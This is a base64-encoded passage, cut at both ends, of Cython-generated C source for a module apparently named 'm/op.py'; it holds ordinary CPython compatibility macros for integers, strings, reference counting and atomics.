ICAoaXNfc2lnbmVkIHx8IGxpa2VseSh2IDwgKHR5cGUpUFlfU1NJWkVfVF9NQVggfHxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHYgPT0gKHR5cGUpUFlfU1NJWkVfVF9NQVgpKSkgIClcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9pc192YWxpZF9pbmRleChQeV9zc2l6ZV90IGksIFB5X3NzaXplX3QgbGltaXQpIHtcbiAgICByZXR1cm4gKHNpemVfdCkgaSA8IChzaXplX3QpIGxpbWl0O1xufVxuI2lmIGRlZmluZWQgKF9fY3BsdXNwbHVzKSAmJiBfX2NwbHVzcGx1cyA+PSAyMDExMDNMXG4gICAgI2luY2x1ZGUgPGNzdGRsaWI+XG4gICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSBzdGQ6OmFicyh2YWx1ZSlcbiNlbGlmIFNJWkVPRl9JTlQgPj0gU0laRU9GX1NJWkVfVFxuICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgYWJzKHZhbHVlKVxuI2VsaWYgU0laRU9GX0xPTkcgPj0gU0laRU9GX1NJWkVfVFxuICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgbGFicyh2YWx1ZSlcbiNlbGlmIGRlZmluZWQgKF9NU0NfVkVSKVxuICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgKChQeV9zc2l6ZV90KV9hYnM2NCh2YWx1ZSkpXG4jZWxpZiBkZWZpbmVkIChfX1NURENfVkVSU0lPTl9fKSAmJiBfX1NURENfVkVSU0lPTl9fID49IDE5OTkwMUxcbiAgICAjZGVmaW5lIF9fUHl4X3NzdF9hYnModmFsdWUpIGxsYWJzKHZhbHVlKVxuI2VsaWYgZGVmaW5lZCAoX19HTlVDX18pXG4gICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSBfX2J1aWx0aW5fbGxhYnModmFsdWUpXG4jZWxzZVxuICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgKCh2YWx1ZTwwKSA/IC12YWx1ZSA6IHZhbHVlKVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeV9zc2l6ZV90IF9fUHl4X3NzaXplX3N0cmxlbihjb25zdCBjaGFyICpzKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGNvbnN0IGNoYXIqIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nKFB5T2JqZWN0Kik7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBjb25zdCBjaGFyKiBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZ0FuZFNpemUoUHlPYmplY3QqLCBQeV9zc2l6ZV90KiBsZW5ndGgpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmcoY29uc3QgY2hhciopO1xuI2RlZmluZSBfX1B5eF9QeUJ5dGVBcnJheV9Gcm9tU3RyaW5nQW5kU2l6ZShzLCBsKSBQeUJ5dGVBcnJheV9Gcm9tU3RyaW5nQW5kU2l6ZSgoY29uc3QgY2hhciopcywgbClcbiNkZWZpbmUgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nICAgICAgICBQeUJ5dGVzX0Zyb21TdHJpbmdcbiNkZWZpbmUgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlVbmljb2RlX0Zyb21TdHJpbmcoY29uc3QgY2hhciopO1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVN0cmluZyhzKSAgICAgKChjaGFyKikgUHlCeXRlc19BU19TVFJJTkcocykpXG4gICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzV3JpdGFibGVTU3RyaW5nKHMpICAgICgoc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVVTdHJpbmcocykgICAgKCh1bnNpZ25lZCBjaGFyKikgUHlCeXRlc19BU19TVFJJTkcocykpXG4gICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzU3RyaW5nKHMpICAgICAoKGNvbnN0IGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNTU3RyaW5nKHMpICAgICgoY29uc3Qgc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNVU3RyaW5nKHMpICAgICgoY29uc3QgdW5zaWduZWQgY2hhciopIFB5Qnl0ZXNfQVNfU1RSSU5HKHMpKVxuICAgICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfQXNTdHJpbmcocykgUHlCeXRlQXJyYXlfQVNfU1RSSU5HKHMpXG4jZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1dyaXRhYmxlU3RyaW5nKHMpICAgICAoKGNoYXIqKSBQeUJ5dGVzX0FzU3RyaW5nKHMpKVxuICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1dyaXRhYmxlU1N0cmluZyhzKSAgICAoKHNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVVTdHJpbmcocykgICAgKCh1bnNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNTdHJpbmcocykgICAgICgoY29uc3QgY2hhciopIFB5Qnl0ZXNfQXNTdHJpbmcocykpXG4gICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzU1N0cmluZyhzKSAgICAoKGNvbnN0IHNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNVU3RyaW5nKHMpICAgICgoY29uc3QgdW5zaWduZWQgY2hhciopIFB5Qnl0ZXNfQXNTdHJpbmcocykpXG4gICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVBcnJheV9Bc1N0cmluZyhzKSBQeUJ5dGVBcnJheV9Bc1N0cmluZyhzKVxuI2VuZGlmXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzV3JpdGFibGVTdHJpbmcocykgICAgKChjaGFyKikoX19weXhfdWludHB0cl90KSBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZyhzKSlcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfQXNXcml0YWJsZVNTdHJpbmcocykgICAgKChzaWduZWQgY2hhciopKF9fcHl4X3VpbnRwdHJfdCkgX19QeXhfUHlPYmplY3RfQXNTdHJpbmcocykpXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzV3JpdGFibGVVU3RyaW5nKHMpICAgICgodW5zaWduZWQgY2hhciopKF9fcHl4X3VpbnRwdHJfdCkgX19QeXhfUHlPYmplY3RfQXNTdHJpbmcocykpXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzU1N0cmluZyhzKSAgICAoKGNvbnN0IHNpZ25lZCBjaGFyKikgX19QeXhfUHlPYmplY3RfQXNTdHJpbmcocykpXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzVVN0cmluZyhzKSAgICAoKGNvbnN0IHVuc2lnbmVkIGNoYXIqKSBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZyhzKSlcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRnJvbUNTdHJpbmcocykgIF9fUHl4X1B5T2JqZWN0X0Zyb21TdHJpbmcoKGNvbnN0IGNoYXIqKXMpXG4jZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfRnJvbUNTdHJpbmcocykgICBfX1B5eF9QeUJ5dGVzX0Zyb21TdHJpbmcoKGNvbnN0IGNoYXIqKXMpXG4jZGVmaW5lIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21DU3RyaW5nKHMpICAgX19QeXhfUHlCeXRlQXJyYXlfRnJvbVN0cmluZygoY29uc3QgY2hhciopcylcbiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0Zyb21DU3RyaW5nKHMpIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nKChjb25zdCBjaGFyKilzKVxuI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfRnJvbU9yZGluYWwobykgICAgICAgUHlVbmljb2RlX0Zyb21PcmRpbmFsKChpbnQpbylcbiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0FzVW5pY29kZSAgICAgICAgICAgIFB5VW5pY29kZV9Bc1VuaWNvZGVcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9OZXdSZWYoUHlPYmplY3QgKm9iaikge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGEwMDAwIHx8IGRlZmluZWQoUHlfTmV3UmVmKVxuICAgIHJldHVybiBQeV9OZXdSZWYob2JqKTtcbiNlbHNlXG4gICAgUHlfSU5DUkVGKG9iaik7XG4gICAgcmV0dXJuIG9iajtcbiNlbmRpZlxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1hOZXdSZWYoUHlPYmplY3QgKm9iaikge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGEwMDAwIHx8IGRlZmluZWQoUHlfWE5ld1JlZilcbiAgICByZXR1cm4gUHlfWE5ld1JlZihvYmopO1xuI2Vsc2VcbiAgICBQeV9YSU5DUkVGKG9iaik7XG4gICAgcmV0dXJuIG9iajtcbiNlbmRpZlxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X093bmVkX1B5X05vbmUoaW50IGIpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9QeUJvb2xfRnJvbUxvbmcobG9uZyBiKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9Jc1RydWUoUHlPYmplY3QqKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9Jc1RydWVBbmREZWNyZWYoUHlPYmplY3QqKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU51bWJlcl9Mb25nKFB5T2JqZWN0KiB4KTtcbiNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9UdXBsZShvYmopXFxcbiAgICAobGlrZWx5KFB5VHVwbGVfQ2hlY2tFeGFjdChvYmopKSA/IF9fUHl4X05ld1JlZihvYmopIDogUHlTZXF1ZW5jZV9UdXBsZShvYmopKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfc3NpemVfdCBfX1B5eF9QeUluZGV4X0FzU3NpemVfdChQeU9iamVjdCopO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9QeUxvbmdfRnJvbVNpemVfdChzaXplX3QpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfaGFzaF90IF9fUHl4X1B5SW5kZXhfQXNIYXNoX3QoUHlPYmplY3QqKTtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4jZGVmaW5lIF9fUHl4X1B5RmxvYXRfQXNEb3VibGUoeCkgKFB5RmxvYXRfQ2hlY2tFeGFjdCh4KSA/IFB5RmxvYXRfQVNfRE9VQkxFKHgpIDogUHlGbG9hdF9Bc0RvdWJsZSh4KSlcbiNkZWZpbmUgX19QeXhfUHlGbG9hdF9BU19ET1VCTEUoeCkgUHlGbG9hdF9BU19ET1VCTEUoeClcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5RmxvYXRfQXNEb3VibGUoeCkgUHlGbG9hdF9Bc0RvdWJsZSh4KVxuI2RlZmluZSBfX1B5eF9QeUZsb2F0X0FTX0RPVUJMRSh4KSBQeUZsb2F0X0FzRG91YmxlKHgpXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfUHlGbG9hdF9Bc0Zsb2F0KHgpICgoZmxvYXQpIF9fUHl4X1B5RmxvYXRfQXNEb3VibGUoeCkpXG4jZGVmaW5lIF9fUHl4X1B5TnVtYmVyX0ludCh4KSAoUHlMb25nX0NoZWNrRXhhY3QoeCkgPyBfX1B5eF9OZXdSZWYoeCkgOiBQeU51bWJlcl9Mb25nKHgpKVxuI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBN1xuICAjaWZuZGVmIF9QeUxvbmdfU0lHTl9NQVNLXG4gICAgI2RlZmluZSBfUHlMb25nX1NJR05fTUFTSyAzXG4gICNlbmRpZlxuICAjaWZuZGVmIF9QeUxvbmdfTk9OX1NJWkVfQklUU1xuICAgICNkZWZpbmUgX1B5TG9uZ19OT05fU0laRV9CSVRTIDNcbiAgI2VuZGlmXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX1NpZ24oeCkgICgoKFB5TG9uZ09iamVjdCopeCktPmxvbmdfdmFsdWUubHZfdGFnICYgX1B5TG9uZ19TSUdOX01BU0spXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX0lzTmVnKHgpICAoKF9fUHl4X1B5TG9uZ19TaWduKHgpICYgMikgIT0gMClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNOb25OZWcoeCkgICghX19QeXhfUHlMb25nX0lzTmVnKHgpKVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc1plcm8oeCkgIChfX1B5eF9QeUxvbmdfU2lnbih4KSAmIDEpXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX0lzUG9zKHgpICAoX19QeXhfUHlMb25nX1NpZ24oeCkgPT0gMClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlVW5zaWduZWQoeCkgIChfX1B5eF9QeUxvbmdfRGlnaXRzKHgpWzBdKVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpICAoKFB5X3NzaXplX3QpICgoKFB5TG9uZ09iamVjdCopeCktPmxvbmdfdmFsdWUubHZfdGFnID4+IF9QeUxvbmdfTk9OX1NJWkVfQklUUykpXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQoeClcXFxuICAgICAgICAoKDEgLSAoUHlfc3NpemVfdCkgX19QeXhfUHlMb25nX1NpZ24oeCkpICogX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkpXG4gICNpZiBkZWZpbmVkKFB5VW5zdGFibGVfTG9uZ19Jc0NvbXBhY3QpICYmIGRlZmluZWQoUHlVbnN0YWJsZV9Mb25nX0NvbXBhY3RWYWx1ZSlcbiAgICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkgICAgIFB5VW5zdGFibGVfTG9uZ19Jc0NvbXBhY3QoKFB5TG9uZ09iamVjdCopIHgpXG4gICAgI2RlZmluZSBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKHgpICBQeVVuc3RhYmxlX0xvbmdfQ29tcGFjdFZhbHVlKChQeUxvbmdPYmplY3QqKSB4KVxuICAjZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSAgICAgKCgoUHlMb25nT2JqZWN0Kil4KS0+bG9uZ192YWx1ZS5sdl90YWcgPCAoMiA8PCBfUHlMb25nX05PTl9TSVpFX0JJVFMpKVxuICAgICNkZWZpbmUgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZSh4KSAgKCgxIC0gKFB5X3NzaXplX3QpIF9fUHl4X1B5TG9uZ19TaWduKHgpKSAqIChQeV9zc2l6ZV90KSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpWzBdKVxuICAjZW5kaWZcbiAgdHlwZWRlZiBQeV9zc2l6ZV90ICBfX1B5eF9jb21wYWN0X3B5bG9uZztcbiAgdHlwZWRlZiBzaXplX3QgIF9fUHl4X2NvbXBhY3RfdXB5bG9uZztcbiAgI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNOZWcoeCkgIChQeV9TSVpFKHgpIDwgMClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNOb25OZWcoeCkgIChQeV9TSVpFKHgpID49IDApXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX0lzWmVybyh4KSAgKFB5X1NJWkUoeCkgPT0gMClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNQb3MoeCkgIChQeV9TSVpFKHgpID4gMClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlVW5zaWduZWQoeCkgICgoUHlfU0laRSh4KSA9PSAwKSA/IDAgOiBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpWzBdKVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpICBfX1B5eF9zc3RfYWJzKFB5X1NJWkUoeCkpXG4gICNkZWZpbmUgX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQoeCkgIFB5X1NJWkUoeClcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpICAoUHlfU0laRSh4KSA9PSAwIHx8IFB5X1NJWkUoeCkgPT0gMSB8fCBQeV9TSVpFKHgpID09IC0xKVxuICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWUoeClcXFxuICAgICAgICAoKFB5X1NJWkUoeCkgPT0gMCkgPyAoc2RpZ2l0KSAwIDogKChQeV9TSVpFKHgpIDwgMCkgPyAtKHNkaWdpdClfX1B5eF9QeUxvbmdfRGlnaXRzKHgpWzBdIDogKHNkaWdpdClfX1B5eF9QeUxvbmdfRGlnaXRzKHgpWzBdKSlcbiAgdHlwZWRlZiBzZGlnaXQgIF9fUHl4X2NvbXBhY3RfcHlsb25nO1xuICB0eXBlZGVmIGRpZ2l0ICBfX1B5eF9jb21wYWN0X3VweWxvbmc7XG4gICNlbmRpZlxuICBzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlMb25nX0NvbXBhY3RBc0xvbmcoUHlPYmplY3QgKngsIGxvbmcgKnJldHVybl92YWx1ZSk7XG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMEE1XG4gICNkZWZpbmUgX19QeXhfUHlMb25nX0RpZ2l0cyh4KSAgKCgoUHlMb25nT2JqZWN0Kil4KS0+bG9uZ192YWx1ZS5vYl9kaWdpdClcbiAgI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpICAoKChQeUxvbmdPYmplY3QqKXgpLT5vYl9kaWdpdClcbiAgI2VuZGlmXG4jZW5kaWZcbiNpZiBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19VVEY4XG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0Zyb21TdHJpbmdBbmRTaXplKGNfc3RyLCBzaXplKSBQeVVuaWNvZGVfRGVjb2RlVVRGOChjX3N0ciwgc2l6ZSwgTlVMTClcbiNlbGlmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0Zyb21TdHJpbmdBbmRTaXplKGNfc3RyLCBzaXplKSBQeVVuaWNvZGVfRGVjb2RlQVNDSUkoY19zdHIsIHNpemUsIE5VTEwpXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZShjX3N0ciwgc2l6ZSkgUHlVbmljb2RlX0RlY29kZShjX3N0ciwgc2l6ZSwgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkcsIE5VTEwpXG4jZW5kaWZcblxuXG5cbiNpZiBkZWZpbmVkKF9fR05VQ19fKSAgICAgJiYgKF9fR05VQ19fID4gMiB8fCAoX19HTlVDX18gPT0gMiAmJiAoX19HTlVDX01JTk9SX18gPiA5NSkpKVxuICAjZGVmaW5lIGxpa2VseSh4KSAgIF9fYnVpbHRpbl9leHBlY3QoISEoeCksIDEpXG4gICNkZWZpbmUgdW5saWtlbHkoeCkgX19idWlsdGluX2V4cGVjdCghISh4KSwgMClcbiNlbHNlIFxuICAjZGVmaW5lIGxpa2VseSh4KSAgICh4KVxuICAjZGVmaW5lIHVubGlrZWx5KHgpICh4KVxuI2VuZGlmIFxuXG4jaWZkZWYgX19jcGx1c3BsdXNcbiNpZiBfX2NwbHVzcGx1cyA+IDIwMTEwM0xcbiNpbmNsdWRlIDx0eXBlX3RyYWl0cz5cbiNlbmRpZlxudGVtcGxhdGUgPHR5cGVuYW1lIFQ+XG5zdGF0aWMgdm9pZCBfX1B5eF9wcmV0ZW5kX3RvX2luaXRpYWxpemUoVCogcHRyKSB7XG4jaWYgX19jcGx1c3BsdXMgPiAyMDExMDNMXG4gICAgaWYgKChzdGQ6OmlzX3RyaXZpYWxseV9kZWZhdWx0X2NvbnN0cnVjdGlibGU8VD46OnZhbHVlKSlcbiNlbmRpZlxuICAgICAgICAqcHRyID0gVCgpO1xuICAgICh2b2lkKXB0cjtcbn1cbiNlbHNlXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X3ByZXRlbmRfdG9faW5pdGlhbGl6ZSh2b2lkKiBwdHIpIHsgKHZvaWQpcHRyOyB9XG4jZW5kaWZcblxuXG4jaWYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X20gPSBOVUxMO1xuI2VuZGlmXG5zdGF0aWMgaW50IF9fcHl4X2xpbmVubztcbnN0YXRpYyBpbnQgX19weXhfY2xpbmVubyA9IDA7XG5zdGF0aWMgY29uc3QgY2hhciAqIGNvbnN0IF9fcHl4X2NmaWxlbm0gPSBfX0ZJTEVfXztcbnN0YXRpYyBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZTtcblxuXG5cbnN0YXRpYyBjb25zdCBjaGFyKiBjb25zdCBfX3B5eF9mW10gPSB7XG4gICJtL29wLnB5Iixcbn07XG5cblxuI2luY2x1ZGUgPHB5dGhyZWFkLmg+XG4jaWZuZGVmIENZVEhPTl9BVE9NSUNTXG4gICAgI2RlZmluZSBDWVRIT05fQVRPTUlDUyAxXG4jZW5kaWZcbiNkZWZpbmUgX19QWVhfQ1lUSE9OX0FUT01JQ1NfRU5BQkxFRCgpIENZVEhPTl9BVE9NSUNTXG4jZGVmaW5lIF9fUFlYX0dFVF9DWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORygpIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4jZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBpbnRcbiNkZWZpbmUgX19weXhfbm9uYXRvbWljX2ludF90eXBlIGludFxuI2lmIENZVEhPTl9BVE9NSUNTICYmIChkZWZpbmVkKF9fU1REQ19WRVJTSU9OX18pICYmXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIChfX1NURENfVkVSU0lPTl9fID49IDIwMTExMkwpICYmXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICFkZWZpbmVkKF9fU1REQ19OT19BVE9NSUNTX18pKVxuICAgICNpbmNsdWRlIDxzdGRhdG9taWMuaD5cbiNlbGlmIENZVEhPTl9BVE9NSUNTICYmIChkZWZpbmVkKF9fY3BsdXNwbHVzKSAmJiAoXFxcbiAgICAgICAgICAgICAgICAgICAgKF9fY3BsdXNwbHVzID49IDIwMTEwM0wpIHx8XFxcbiAgICAgICAgICAgICAgICAgICAgKGRlZmluZWQoX01TQ19WRVIpICYmIF9NU0NfVkVSID49IDE3MDApKSlcbiAgICAjaW5jbHVkZSA8YXRvbWljPlxuI2VuZGlmXG4jaWYgQ1lUSE9OX0FUT01JQ1MgJiYgKGRlZmluZWQoX19TVERDX1ZFUlNJT05fXykgJiZcXFxuICAgICAgICAgICAgICAgICAgICAgICAgKF9fU1REQ19WRVJTSU9OX18gPj0gMjAxMTEyTCkgJiZcXFxuICAgICAgICAgICAgICAgICAgICAgICAgIWRlZmluZWQoX19TVERDX05PX0FUT01JQ1NfXykgJiZcXFxuICAgICAgICAgICAgICAgICAgICAgICBBVE9NSUNfSU5UX0xPQ0tfRlJFRSA9PSAyKVxuICAgICN1bmRlZiBfX3B5eF9hdG9taWNfaW50X3R5cGVcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBhdG9taWNfaW50XG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcHRyX3R5cGUgYXRvbWljX3VpbnRwdHJfdFxuICAgICNkZWZpbmUgX19weXhfbm9uYXRvbWljX3B0cl90eXBlIHVpbnRwdHJfdFxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfcmVsYXhlZCh2YWx1ZSkgYXRvbWljX2ZldGNoX2FkZF9leHBsaWNpdCh2YWx1ZSwgMSwgbWVtb3J5X29yZGVyX3JlbGF4ZWQpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKHZhbHVlKSBhdG9taWNfZmV0Y2hfYWRkX2V4cGxpY2l0KHZhbHVlLCAxLCBtZW1vcnlfb3JkZXJfYWNxX3JlbClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwodmFsdWUpIGF0b21pY19mZXRjaF9zdWJfZXhwbGljaXQodmFsdWUsIDEsIG1lbW9yeV9vcmRlcl9hY3FfcmVsKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N1Yih2YWx1ZSwgYXJnKSBhdG9taWNfZmV0Y2hfc3ViKHZhbHVlLCBhcmcpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW50X2NtcF9leGNoYW5nZSh2YWx1ZSwgZXhwZWN0ZWQsIGRlc2lyZWQpIGF0b21pY19jb21wYXJlX2V4Y2hhbmdlX3N0cm9uZyh2YWx1ZSwgZXhwZWN0ZWQsIGRlc2lyZWQpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfbG9hZCh2YWx1ZSkgYXRvbWljX2xvYWQodmFsdWUpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3RvcmUodmFsdWUsIG5ld192YWx1ZSkgYXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX3JlbGF4ZWQodmFsdWUpIGF0b21pY19sb2FkX2V4cGxpY2l0KHZhbHVlLCBtZW1vcnlfb3JkZXJfcmVsYXhlZClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfYWNxdWlyZSh2YWx1ZSkgYXRvbWljX2xvYWRfZXhwbGljaXQodmFsdWUsIG1lbW9yeV9vcmRlcl9hY3F1aXJlKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSkgYXRvbWljX2V4Y2hhbmdlKHZhbHVlLCAoX19weXhfbm9uYXRvbWljX3B0cl90eXBlKW5ld192YWx1ZSlcbiAgICAjaWYgZGVmaW5lZChfX1BZWF9ERUJVR19BVE9NSUNTKSAmJiBkZWZpbmVkKF9NU0NfVkVSKVxuICAgICAgICAjcHJhZ21hIG1lc3NhZ2UgKCJVc2luZyBzdGFuZGFyZCBDIGF0b21pY3MiKVxuICAgICNlbGlmIGRlZmluZWQoX19QWVhfREVCVUdfQVRPTUlDUylcbiAgICAgICAgI3dhcm5pbmcgIlVzaW5nIHN0YW5kYXJkIEMgYXRvbWljcyJcbiAgICAjZW5kaWZcbiNlbGlmIENZVEhPTl9BVE9NSUNTICYmIChkZWZpbmVkKF9fY3BsdXNwbHVzKSAmJiAoXFxcbiAgICAgICAgICAgICAgICAgICAgKF9fY3BsdXNwbHVzID49IDIwMTEwM0wpIHx8XFxcblxcXG4gICAgICAgICAgICAgICAgICAgIChkZWZpbmVkKF9NU0NfVkVSKSAmJiBfTVNDX1ZFUiA+PSAxNzAwKSkgJiZcXFxuICAgICAgICAgICAgICAgICAgICBBVE9NSUNfSU5UX0xPQ0tfRlJFRSA9PSAyKVxuICAgICN1bmRlZiBfX3B5eF9hdG9taWNfaW50X3R5cGVcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBzdGQ6OmF0b21pY19pbnRcbiAgICAjZGVmaW5lI